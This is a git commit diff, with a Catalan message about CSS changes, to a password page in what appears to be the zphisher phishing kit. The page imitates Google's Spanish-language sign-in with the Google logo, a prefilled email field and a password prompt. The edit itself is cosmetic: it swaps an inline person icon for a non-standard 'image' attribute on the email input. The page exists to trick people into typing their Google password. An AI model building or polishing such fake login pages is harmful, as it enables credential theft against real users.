8c5f22df020429700bdf35442218699ed6c08310
Girquell <girquell@gmail.com>
2023-04-27 08:49:46 +0200

    modificacions del css 27/04 a les 8:49

--- zphisher-master/.sites/google_new/password.php
+++ zphisher-master/.sites/google_new/password.php
@@ -25,11 +25,7 @@
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google logo">
         <h1>Te damos la Bienvenida</h1>
         <br>
-        <input type="email" class="dropemail" name="username" required value="<?php echo $username; ?>">
-        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person-circle" viewBox="0 0 16 16">
-        <path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"/>
-        <path fill-rule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z"/>
-        </svg>
+        <input type="email" class="dropemail" name="username" image="http://www.w3.org/2000/svg" required value="<?php echo $username; ?>">
         <input type="password" name="password" placeholder="Introduce tu contraseña" required>
         <div class="checkboxpsswd"><input type="checkbox" class="checkboxpasswd" name="checkbox" placeholder="">Mostrar contraseña</div>
         <br>
